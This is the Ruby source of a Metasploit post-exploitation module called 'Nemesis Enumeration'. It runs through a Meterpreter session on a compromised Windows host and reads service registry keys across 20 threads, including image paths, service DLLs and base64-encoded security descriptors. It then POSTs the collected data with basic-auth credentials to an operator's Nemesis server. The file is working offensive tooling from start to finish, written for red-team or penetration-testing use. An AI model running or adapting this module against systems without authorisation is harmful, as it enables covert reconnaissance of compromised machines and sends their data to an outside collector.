##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'json'
require 'uri'
require 'net/http'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::Common

  # config globals
  SERVICES_PATH = 'HKLM\\SYSTEM\\CurrentControlSet\\Services'
  $nemesis_url =  nil
  $nemesis_user = nil
  $nemesis_password = nil
  $nemesis_project = nil
  $expiration_days = nil
  $remote_paths = Hash.new
  $nemesis_yaml = "#{Msf::Config.get_config_root}/nemesis.yaml"


  # reads the nemesis.yaml settings into the global variables
  def read_settings()
    read = nil
    if File.exist?("#{$nemesis_yaml}")
      ldconfig = YAML.load_file("#{$nemesis_yaml}")
      $nemesis_url = ldconfig['nemesis_url']
      $nemesis_user, $nemesis_password = ldconfig['nemesis_creds'].split(":")
      $nemesis_project = ldconfig['project_name']
      $expiration_days = ldconfig['expiration_days'].to_i
      read = true
    else
      print_error("You must create a #{$nemesis_yaml} file")
      return read
    end
    return read
  end


  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Nemesis Enumeration',
      'Description'   => %q( This module will gather data for Nemesis. ),
      'License'       => MSF_LICENSE,
      'Author'        => [ 'harmj0y' ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
    read_settings()
  end


  def print_status(msg='')
    super("#{peer} - #{msg}")
  end


  def print_good(msg='')
    super("#{peer} - #{msg}")
  end


  def print_error(msg='')
    super("#{peer} - #{msg}")
  end


  # helper to build the metadata hash table for data submission
  def get_metadata(agent_uuid, data_type = "registry_value")
    timestamp = Time.now
    expiration = timestamp + $expiration_days * 86400 # 24 * 60 * 60
    metadata = {
      "agent_type"  => "meterpreter",
      "automated"   => true,
      "agent_id"    => agent_uuid,
      "data_type"   => data_type,
      "project"     => $nemesis_project,
      # "source"     => session.sys.config.sysinfo["Computer"],
      "timestamp"   => timestamp.utc.iso8601,
      "expiration"  => expiration.utc.iso8601
    }
    return metadata
  end


  # posts an entry hashtable to the /api/data endpoint
  def post_data(data)
    uri = URI("#{$nemesis_url}data")
    req = Net::HTTP::Post.new(uri, 'Content-Type' => 'application/json')
    req.basic_auth $nemesis_user, $nemesis_password
    req['User-Agent'] = "METERPRETER"
    req.body = data.to_json
    begin
      res = Net::HTTP.start(uri.hostname, uri.port) { |http|
        http.request(req)
      }
      return res.body
    rescue ::Exception => e
      print_error("Exception connecting to Nemesis : #{e}")
      return nil
    end
  end


  # enumerates services via their registry keys in a threaded manner
  def get_service_keys
    threadnum = 0
    threads = []
    regkeys = []

    root_key, base_key = session.sys.registry.splitkey(SERVICES_PATH)
    perms = meterpreter_registry_perms(KEY_READ, REGISTRY_VIEW_NATIVE)

    registry_enumkeys(SERVICES_PATH).each do |s|
      if threadnum < 20
        threads.push(::Thread.new {
            begin

              ["DisplayName", "Description", "ObjectName", "ImagePath", "Type", "Start"].each do |valname|
                val = session.sys.registry.query_value_direct(root_key, "#{base_key}\\#{s}", valname, perms)
                if val.data and not val.data.empty?
                  regkey = {
                    "key" => "#{SERVICES_PATH}\\#{s}",
                    "value_name" => valname,
                    "value_kind" => 1,
                    "value" => val.data
                  }
                  regkeys << regkey
                end
              end

              ["ServiceDll", "ServiceMain"].each do |valname|
                val = session.sys.registry.query_value_direct(root_key, "#{base_key}\\#{s}", valname, perms)
                if val.data and not val.data.empty?
                  regkey = {
                    "key" => "#{SERVICES_PATH}\\#{s}\\Parameters",
                    "value_name" => valname,
                    "value_kind" => 1,
                    "value" => val.data
                  }
                  regkeys << regkey
                end
              end

              val = session.sys.registry.query_value_direct(root_key, "#{base_key}\\#{s}\\Security", "Security", perms)
              if val.data and not val.data.empty?
                regkey = {
                  "key" => "#{SERVICES_PATH}\\#{s}\\Parameters",
                  "value_name" => "Security",
                  "value_kind" => 3,
                  "value" => Rex::Text.encode_base64(val.data)
                }
                regkeys << regkey
              end
            rescue
            end
          })
        threadnum += 1
      else
        sleep(0.05) and threads.delete_if {|x| not x.alive?} while not threads.empty?
        threadnum = 0
      end
    end

    return regkeys
  end


  def run

    service_keys = get_service_keys()
    # loot_path = store_loot("#{session.uuid}_registryservices.json", 'application/json', session, service_keys.to_json, "registryservices.json", "enum_nemesis")

    data = {
      "metadata"  => get_metadata(session.uuid),
      "data"      => service_keys
    }

    resp = post_data(data)

    if !resp.nil?
      resp_parsed = JSON.parse(resp)
      if resp_parsed.has_key?("object_id")
        submission_id = resp_parsed["object_id"]
        print_good("Services enumerated via registry keys, Nemesis submission ID: #{submission_id}")
      else
        print_error("Nemesis response: #{resp}")
      end
    end
  end

end
